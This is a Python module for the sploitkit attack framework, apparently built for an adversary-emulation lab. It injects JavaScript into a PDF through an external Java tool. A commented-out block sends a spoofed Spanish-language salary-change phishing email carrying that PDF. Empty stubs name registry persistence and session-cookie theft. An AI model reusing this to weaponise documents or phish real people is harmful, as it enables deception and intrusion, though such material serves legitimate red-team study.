from sploitkit import *
import os
import subprocess

path = os.path.dirname(os.path.realpath(__file__))
cwd = os.getcwd()
main_path = path.split('/')

class JS2PDFInjection(Module):
	""" Module used to inject javascript code into a PDF file. ID: T1193	

	Author:  your name (your email)
	Version: 1.0
	"""
	ID = 'T1193'
	tactic = 'Initial Access'

	#MODULE OPTIONS
	config  = Config({
	        Option(
	            'ATTACHMENT',
	            "PDF File to be injected with JS code",
	            True,
	            set_callback=lambda o: o.root._set_app_folder(),
	        ): "~/.{appname}",
	        Option(
	            'JS_Code',
	            "Javascript Code that will be injected into the attachment",
	            True,
	            #set_callback=lambda o: o.root._set_logging(o.value),
	        ): "~/.{appname}",
	    })


	def run(self):

		attachment = ''.join(list(self.config.get('ATTACHMENT')))
		js = ''.join(list(self.config.get('JS_Code')))

		#TEST ARGUMENTS
		attachment = "/home/kali/AE-temp/PruebasTT/InitialAccess/plan2021.pdf"
		js = "/home/kali/AE-temp/PruebasTT/InitialAccess/test.js"
		
		subprocess.call(['java','-jar',cwd+'/tools/JS2PDFInjector/JS2PDFInjector-1.0.jar',attachment,js])

		'''
		# Create a text/plain message
		msg = email.mime.multipart.MIMEMultipart()
		msg['Subject'] = 'Nuevo programa de sueldos 2021.'
		msg['From'] = 'wwhite@ecorp.local'
		msg['To'] = 'Administrator@ecorp.local'

		# The main body is just another attachment
		body = email.mime.text.MIMEText("""Estimados empleados de ecorp, les hago saber en el siguiente documento sobre los cambios que tendremos en las nómina​s y los sueldos para el año entrante.
		Saludos, y excelente fin de año!
		Walter White
		Director General
		""")
		msg.attach(body)

		# Attach PDF 
		filename='plan2021.pdf'
		fp=open(filename,'rb')
		att = email.mime.application.MIMEApplication(fp.read(),_subtype="pdf")
		fp.close()
		att.add_header('Content-Disposition','attachment',filename=filename)
		msg.attach(att)

		s = smtplib.SMTP(host='ecorp.local')
		s.sendmail('wwhite@ecorp.local',['Administrator@ecorp.local'], msg.as_string())
		s.quit()

		pass
'''

"""

class RegistryRunKeys(Module):
	\""" Description here 

	Author:  your name (your email)
	Version: 1.0
	\"""
	def run(self):
		pass



class StealWebSessionCookie(Module):
	\""" Description here 

	Author:  your name (your email)
	Version: 1.0
	\"""
	def run(self):
		pass


class MultiStageChannels(Module):
	\""" Description here 

	Author:  your name (your email)
	Version: 1.0
	\"""
	def run(self):
		pass

"""